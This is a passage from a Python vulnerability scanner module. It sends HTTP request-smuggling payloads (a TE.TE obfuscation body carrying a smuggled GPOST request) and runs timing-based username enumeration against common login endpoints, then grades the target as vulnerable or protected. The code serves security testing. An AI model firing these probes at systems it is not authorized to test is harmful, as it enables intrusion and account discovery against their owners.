                "body": "5c\r\nGPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n",
                "desc": "TE.TE obfuscation — duplicate Transfer-Encoding headers with different casing",
            },
        ]

        test_paths = ["/", "/api", "/login"]

        for path in test_paths:
            for probe in smuggling_probes:
                url = f"{self.base_url}{path}"
                try:
                    start = time.time()
                    resp = await self.client.post(
                        url,
                        content=probe["body"].encode(),
                        headers={
                            **probe["headers"],
                            "Content-Type": "application/x-www-form-urlencoded",
                        }
                    )
                    elapsed = int((time.time() - start) * 1000)
                    body = resp.text[:3000]

                    timeout_indicator = elapsed > 5000
                    desync_indicator = resp.status_code in (400, 500, 502, 503)

                    smuggle_evidence = any(kw in body.lower() for kw in [
                        "bad request", "invalid request", "request timeout",
                        "connection reset", "desync", "smuggl",
                    ])

                    double_response = body.count("HTTP/") > 1

                    vulnerable = double_response or (timeout_indicator and desync_indicator)
                    suspicious = smuggle_evidence or desync_indicator

                    if vulnerable:
                        severity = "CRITICAL"
                        verdict = f"VULNERABLE — HTTP smuggling detected ({probe['name']})"
                    elif suspicious:
                        severity = "HIGH"
                        verdict = f"SUSPICIOUS — Possible smuggling vector ({probe['name']})"
                    else:
                        severity = "INFO"
                        verdict = "PROTECTED"

                    result = ProbeResult(
                        probe_type="HTTP_REQUEST_SMUGGLING", target=self.target,
                        endpoint=path, method="POST",
                        status_code=resp.status_code, response_time_ms=elapsed,
                        vulnerable=vulnerable or suspicious,
                        verdict=verdict, severity=severity,
                        description=probe["desc"],
                        payload=probe["body"][:100],
                        evidence=(
                            f"HTTP {resp.status_code}, elapsed={elapsed}ms, "
                            f"desync={desync_indicator}, double_resp={double_response}, "
                            f"smuggle_evidence={smuggle_evidence}"
                        ),
                        response_snippet=body[:200] if (vulnerable or suspicious) else "",
                        timestamp=self._ts(),
                    )
                    self.report.probes.append(result)

                    if vulnerable:
                        self._tlog(
                            "[THREAT]",
                            f"HTTP SMUGGLING CONFIRMED: {path} — {probe['name']} desync detected",
                            "error"
                        )
                    elif suspicious:
                        self._tlog(
                            "[ALERT]",
                            f"SMUGGLING SUSPICIOUS: {path} — {probe['name']} (HTTP {resp.status_code}, {elapsed}ms)",
                            "warn"
                        )

                except Exception as e:
                    self.report.probes.append(ProbeResult(
                        probe_type="HTTP_REQUEST_SMUGGLING", target=self.target,
                        endpoint=path, method="POST", status_code=0, response_time_ms=0,
                        vulnerable=False, verdict="ERROR", severity="INFO",
                        description=probe["desc"], error=str(e)[:200],
                        timestamp=self._ts(),
                    ))

    async def _probe_timing_side_channel(self):
        self._tlog("[ATTACK]", "Initiating TIMING SIDE-CHANNEL username enumeration...", "warn")

        login_endpoints = [
            "/api/login", "/api/auth/login", "/login", "/api/signin",
            "/api/v1/auth/login", "/auth/login", "/api/authenticate",
        ]

        valid_usernames = ["admin", "root", "administrator", "user", "test"]
        invalid_usernames = [
            "xq7z9mNonExistent__" + str(int(time.time())),
            "fake__user__zzz__" + str(int(time.time())),
        ]

        for endpoint in login_endpoints:
            url = f"{self.base_url}{endpoint}"

            valid_times = []
            invalid_times = []

            for username in invalid_usernames:
                try:
                    start = time.time()
                    resp = await self.client.post(
                        url,
                        json={"username": username, "password": "wrongpassword123", "email": username},
                        headers={"Content-Type": "application/json"},
                    )
                    elapsed = int((time.time() - start) * 1000)
                    if resp.status_code != 404:
                        invalid_times.append(elapsed)
                except Exception:
                    pass

            if not invalid_times:
                continue

            for username in valid_usernames[:3]:
                try:
                    start = time.time()
                    resp = await self.client.post(
                        url,
                        json={"username": username, "password": "wrongpassword123", "email": username},
                        headers={"Content-Type": "application/json"},
                    )
                    elapsed = int((time.time() - start) * 1000)
                    if resp.status_code != 404:
                        valid_times.append(elapsed)
                except Exception:
                    pass

            if not valid_times or not invalid_times:
                continue

            avg_valid = sum(valid_times) / len(valid_times)
            avg_invalid = sum(invalid_times) / len(invalid_times)
            time_delta = abs(avg_valid - avg_invalid)

            vulnerable = time_delta > 50
            suspicious = time_delta > 20

            if vulnerable:
                severity = "HIGH"
                verdict = (
                    f"VULNERABLE — Timing difference detected: "
                    f"valid={avg_valid:.0f}ms vs invalid={avg_invalid:.0f}ms (Δ{time_delta:.0f}ms)"
                )
            elif suspicious:
                severity = "MEDIUM"
                verdict = (
                    f"SUSPICIOUS — Minor timing difference: "
                    f"valid={avg_valid:.0f}ms vs invalid={avg_invalid:.0f}ms (Δ{time_delta:.0f}ms)"
                )
            else:
                severity = "INFO"
                verdict = "PROTECTED — Constant-time response"

            result = ProbeResult(
                probe_type="TIMING_SIDE_CHANNEL", target=self.target,
                endpoint=endpoint, method="POST",
                status_code=0, response_time_ms=int(time_delta),
                vulnerable=vulnerable or suspicious,
                verdict=verdict, severity=severity,
                description="Timing side-channel username enumeration via login response time differential",
                payload=f"valid_users={valid_usernames[:3]}, invalid_users={invalid_usernames}",
                evidence=(
                    f"avg_valid={avg_valid:.1f}ms, avg_invalid={avg_invalid:.1f}ms, "
                    f"delta={time_delta:.1f}ms, samples_valid={len(valid_times)}, "
                    f"samples_invalid={len(invalid_times)}"
                ),
                timestamp=self._ts(),
            )
            self.report.probes.append(result)

            if vulnerable:
                self._tlog(
                    "[THREAT]",
                    f"TIMING SIDE-CHANNEL CONFIRMED: {endpoint} — "
                    f"Δ{time_delta:.0f}ms between valid/invalid usernames",
                    "error"
                )
            elif suspicious:
                self._tlog(
                    "[ALERT]",
                    f"TIMING ANOMALY: {endpoint} — Δ{time_delta:.0f}ms",
                    "warn"
                )


async def run_sniper(target: str, findings: List[Dict] = None, scan_id: str = "") -> dict:
    engine = SniperEngine(target, findings or [], scan_id)
    report = await engine.run_all()
    return report.to_dict()


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(json.dumps({"error": "Usage: python -m scanner.sniper_engine <target> [findings_json_file]"}))
        sys.exit(1)

    target = sys.argv[1]
    findings = []

    if len(sys.argv) > 2:
        try:
            with open(sys.argv[2], "r") as f:
                findings = json.load(f)
        except Exception as e:
            emit("log_stream", {"message": f"Failed to load findings: {e}", "level": "error", "phase": "sniper"})

    async def main():
        report = await run_sniper(target, findings)
        emit("sniper_report", report)
        emit("completed", {"status": "done", "probes": report["total_probes"], "vulns": report["vulnerabilities_confirmed"]})

    asyncio.run(main())
